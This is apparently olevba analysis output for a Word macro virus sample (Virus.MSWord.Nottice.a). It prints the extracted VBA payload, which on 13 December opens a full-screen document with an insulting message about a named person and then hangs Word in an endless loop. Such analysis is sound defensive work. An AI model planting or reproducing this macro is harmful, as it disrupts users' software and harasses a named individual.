olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.a-9f5190bb1ee70d0327f941a9adfa3f2064088486
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nottice.a-9f5190bb1ee70d0327f941a9adfa3f2064088486 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WININIT 
in file: Virus.MSWord.Nottice.a-9f5190bb1ee70d0327f941a9adfa3f2064088486 - OLE stream: 'WININIT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If WordBasic.Day(WordBasic.Now()) = 13 And WordBasic.Month(WordBasic.Now()) = 12 Then
    WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Imprint MT Shadow"
    WordBasic.FontSize 60
    WordBasic.Bold
    WordBasic.Insert "IMPORTAT NOTTICE!"
    WordBasic.StartOfLine
    WordBasic.CharRight 1, 1
    WordBasic.FormatFont Points:="48", Color:=6
    WordBasic.EndOfLine
    WordBasic.InsertPara
    WordBasic.InsertPara
    WordBasic.FontSize 48
    WordBasic.Insert "HANSSI A. A. IS MARRIED WITH A LOSSER."
HangOn:
GoTo HangOn
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

